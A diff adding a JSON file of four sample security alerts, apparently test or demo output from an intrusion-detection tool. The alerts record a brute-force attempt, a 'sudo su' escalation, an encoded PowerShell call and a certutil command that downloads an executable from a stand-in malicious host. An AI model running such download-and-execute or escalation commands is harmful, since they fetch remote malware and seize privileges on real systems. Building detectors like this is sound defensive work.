@@ -1,0 +1,33 @@
+[
+    {
+        "timestamp": "2025-07-12T08:21:18",
+        "alert_type": "Brute Force Attack",
+        "ip": "192.168.1.5",
+        "description": "3 or more failed login attempts detected from IP 192.168.1.5",
+        "severity": "high"
+    },
+    {
+        "timestamp": "2025-07-12T08:22:05",
+        "alert_type": "Privilege Escalation Attempt",
+        "user": "guest",
+        "command": "sudo su",
+        "description": "Suspicious privilege command: sudo su",
+        "severity": "medium"
+    },
+    {
+        "timestamp": "2025-07-12T08:22:40",
+        "alert_type": "Suspicious Process Detected",
+        "user": "guest",
+        "command": "cmd.exe /c powershell -enc ZgBvAG8A",
+        "description": "Suspicious command executed: cmd.exe /c powershell -enc ZgBvAG8A",
+        "severity": "medium"
+    },
+    {
+        "timestamp": "2025-07-12T08:24:00",
+        "alert_type": "Suspicious Process Detected",
+        "user": "guest",
+        "command": "certutil.exe -urlcache -split -f http://malicious.com/m.exe",
+        "description": "Suspicious command executed: certutil.exe -urlcache -split -f http://malicious.com/m.exe",
+        "severity": "medium"
+    }
+]
